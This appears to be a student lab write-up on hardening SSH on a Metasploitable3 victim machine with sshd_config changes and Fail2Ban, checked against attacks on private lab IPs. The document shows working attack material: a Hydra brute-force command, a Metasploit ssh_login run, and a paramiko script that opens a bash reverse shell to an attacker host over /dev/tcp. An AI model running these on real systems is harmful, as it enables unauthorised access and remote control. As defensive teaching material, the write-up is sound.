
# Phase 3: Defensive Strategy – SSH Protection & Attack Prevention

## Objective

This phase implements an SSH hardening strategy and intrusion prevention system (Fail2Ban) on the **Metasploitable3 victim machine**. The objective is to detect and block brute-force SSH attacks, disable insecure access methods, and confirm defense effectiveness through follow-up validation attempts.

---

## Defensive Mechanism Implementation

### 1. SSH Configuration Hardening

To eliminate password-based brute-force vectors and reduce root access risks:

#### Disable Root Login
```bash
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
```

#### Disable Password Authentication
```bash
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
```

#### Restart SSH Service
```bash
sudo service ssh restart
```
<img width="709" alt="Screenshot 2025-04-23 025333" src="https://github.com/user-attachments/assets/3d494307-7e31-45cf-87db-bfc5f75ed306" />


 **Why?**
- Disabling `PermitRootLogin` mitigates privilege escalation risks.
- Disabling `PasswordAuthentication` forces SSH key-based access, which is immune to password brute-force attacks.

---

### 2. Intrusion Prevention with Fail2Ban

**Fail2Ban** monitors `/var/log/auth.log` for failed SSH login attempts and bans IPs after repeated failures.

#### Restart and Check Fail2Ban
```bash
sudo service fail2ban restart
sudo fail2ban-client status ssh
```

Screenshot shows:
- `File list: /var/log/auth.log`
- No failed attempts yet
- No IPs currently banned

This confirms that the jail is correctly monitoring SSH activity and ready to react to future attack attempts.

---

## Testing & Validation

### Before Defense
- **SSH Brute-Force Attack with Hydra**:
  ```bash
  hydra -L usernames.txt -P rockyou.txt ssh://192.168.142.131
  ```
  - Successfully obtained `vagrant:vagrant` credentials
  - SSH login was accepted (via password)

- **Metasploit Exploitation**:
  ```bash
  use auxiliary/scanner/ssh/ssh_login
  set USERNAME vagrant
  set PASSWORD vagrant
  set RHOSTS 192.168.142.131
  run
  ```
  - Login succeeded and session was opened

---

### After Defense

#### Hydra Test
- Hydra shows `Permission denied` for all password guesses.
- This happens because password authentication is completely disabled, not just rate-limited.

#### Metasploit SSH Login
- Metasploit module runs but no sessions are created.
- Terminal shows `Allowed types: ['publickey']` indicating password authentication is now disabled server-side.

Results:

<img width="689" alt="Screenshot 2025-04-23 030038" src="https://github.com/user-attachments/assets/8a2efb61-e752-4a42-88f3-0b80002b9c93" />
<img width="644" alt="Screenshot 2025-04-23 025808" src="https://github.com/user-attachments/assets/77b68172-440d-49fc-b8d6-5b18543dd2f3" />

---

## Outcome & Analysis

-  SSH hardening via `sshd_config` settings fully blocked password-based access.
-  Fail2Ban setup completed and is monitoring log activity—ready to ban future offending IPs.
-  Follow-up attacks (Hydra + Metasploit) failed to access the system post-hardening.
-  Defense successfully mitigated previously demonstrated attack vectors.

---

## Lessons Learned

- Simple SSH configuration changes are powerful and effective when combined with monitoring.
- Disabling unused authentication types (e.g., passwords) is often more secure than relying solely on detection/blocking tools.

> The system is now secure against the exact brute-force and reverse shell tactics used in Phase 1.

---

## Bypassing Brute-Force Detection with Direct Credential Use

### Scenario: Attacker Skips Hydra & Uses Known Credentials

If the attacker already knows valid credentials (e.g., from OSINT, leaks, insider threat) and uses a custom Python script (like in Phase 1) instead of brute-forcing:

#### Example:
```python
import paramiko

target_ip = "192.168.142.131"
username = "vagrant"
password = "vagrant"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(target_ip, username=username, password=password)
client.exec_command("bash -i >& /dev/tcp/192.168.142.129/4444 0>&1")
client.close()
```

### Observation

- This script uses `paramiko` to connect via SSH and directly trigger a reverse shell.
- **Fail2Ban will not block it** if:
  - The credentials are correct on the first try.
  - `PasswordAuthentication` is still enabled.
- **Defense fails** in this case if hardening was not performed.

---

## Final Takeaway:

Only relying on Fail2Ban is insufficient against credential leaks or internal threats.

The most **effective and proactive defense** is:
- **Disable `PasswordAuthentication`**
- Enforce **key-based authentication only**

This ensures that even if an attacker *knows* the password, they **cannot authenticate** without the correct private key.

